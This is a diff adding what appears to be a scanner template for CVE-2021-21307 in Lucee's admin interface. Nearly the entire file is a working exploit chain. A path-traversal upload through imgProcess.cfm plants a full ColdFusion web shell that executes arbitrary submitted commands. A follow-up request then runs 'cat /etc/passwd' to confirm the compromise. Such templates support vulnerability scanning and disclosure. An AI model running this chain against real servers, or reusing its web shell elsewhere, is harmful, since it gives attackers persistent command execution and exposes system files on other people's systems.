@@ -1,0 +1,79 @@
+id: lucee-admin-rce
+info:
+  name: Lucee Admin Remote Code Execution (CVE-2021-21307)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,CVE-2021-21307
+variables:
+  t1: "{{rand_base(27)}}"
+flow: http(1) && http(2) && http(3)
+http:
+  - id: check-file-path
+    method: POST
+    path:
+      - "{{BaseURL}}/lucee/admin/imgProcess.cfm?file=/whatever"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "imgSrc=a"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: upload-payload
+    method: POST
+    path:
+      - "{{BaseURL}}/lucee/admin/imgProcess.cfm?file=/../../../context/{{t1}}.cfm"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      imgSrc=
+      <cfoutput>
+
+      <table>
+      <form method="POST" action="">
+      <tr><td>Command:</td><td><input type=test name="cmd" size=50
+      <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
+      <tr><td>Options:</td><td> <input type=text name="opts" size=50
+      <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
+      <tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
+      <cfif isdefined("form.timeout")>value="#form.timeout#"
+      <cfelse> value="5"</cfif>></td></tr>
+      </table>
+      <input type=submit value="Exec" >
+      </form>
+      <cfif isdefined("form.cmd")>
+      <cfsavecontent variable="myVar">
+      <cfexecute name = "#Form.cmd#"
+      arguments = "#Form.opts#"
+      timeout = "#Form.timeout#">
+      </cfexecute>
+      </cfsavecontent>
+      <pre>
+      #HTMLCodeFormat(myVar)#
+      </pre>
+      </cfif>
+      </cfoutput>
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: check-rce
+    method: POST
+    path:
+      - "{{BaseURL}}/lucee/{{t1}}.cfm"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "cmd=cat /etc/passwd&opts=&timeout=5"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+          - "Command"
+        part: body
